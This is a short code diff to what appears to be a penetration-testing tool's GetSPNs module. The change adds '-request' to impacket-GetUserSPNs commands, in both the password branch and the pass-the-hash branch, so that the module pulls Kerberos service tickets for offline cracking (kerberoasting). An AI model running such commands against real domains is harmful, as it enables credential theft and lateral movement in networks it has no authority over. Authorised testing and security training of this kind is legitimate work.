@@ -17,12 +17,11 @@ class GetSPNs(UserEnumModuleBase):
         cmdfile =  self.get_log_name("cmd")
         if is_ntlm_hash(self.args["password"]):
             hashes = "-hashes :" + self.args["password"] # Thttps://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/lateral-movement-in-active-directory/active-directory-lateral-movement-techniques/pass-the-hash
-            self.command = f"impacket-GetUserSPNs -dc-ip {self.target} {domain}/{user} {hashes}"
+            self.command = f"impacket-GetUserSPNs -dc-ip {self.target} {domain}/{user} {hashes} -request"
             self.args["pmode"] = "H" 
         else:
             passw = self.args["password"]
-            self.command = f"impacket-GetUserSPNs -dc-ip {self.target} {domain}/{user}:'{passw}'"
+            self.command = f"impacket-GetUserSPNs -dc-ip {self.target} {domain}/{user}:'{passw}' -request"
 
-        # TODO TEST / CHeck
         
         self.output = self.get_system_cmd_outptut(self.command, logcmdline=cmdfile, logoutput=logfile)
